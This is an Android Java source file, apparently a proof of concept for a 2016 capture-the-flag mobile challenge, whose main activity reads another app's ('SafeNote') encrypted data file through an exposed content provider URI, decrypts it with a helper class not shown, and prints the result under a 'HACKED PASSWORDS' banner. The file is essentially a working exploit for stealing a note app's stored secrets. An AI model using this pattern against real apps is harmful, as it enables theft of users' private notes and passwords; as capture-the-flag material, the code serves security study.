package com.example.prova;

import androidx.appcompat.app.AppCompatActivity;

import android.net.Uri;
import android.os.Bundle;
import android.widget.TextView;

import java.io.FileNotFoundException;
import java.io.InputStream;

public class MainActivity extends AppCompatActivity {
    private TextView appContent;
    private static final String SAFENOTE_CP_URI =
            "content://com.digitalpurr.safenote.fileprovider/files/container.dat";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        appContent = (TextView) findViewById(R.id.textView);
        appContent.setText("--- Panoptis 2016 ---\n");
        appContent.append("--- ELLAK PoC for Mobile Challenge ---\n");
        appContent.append("--- rkmylo & h3ph4est7s ---\n");

        appContent.append("\n[+] ----------------\n");
        appContent.append("[+] HACKED PASSWORDS\n");
        appContent.append("[+] ----------------\n");
        ph4ckSafeNote();
    }
    private void ph4ckSafeNote() {
        try {
            Uri singleUri = Uri.parse(SAFENOTE_CP_URI);
            InputStream instream = getContentResolver().openInputStream(singleUri);
            SafeNotePh4ker sn = new SafeNotePh4ker();
            String decrypted = sn.ph4ckNote(instream);
            appContent.append("\n[*] Title:     Congratulations.txt\n");
            appContent.append(decrypted + "\n");
        }
        catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }
}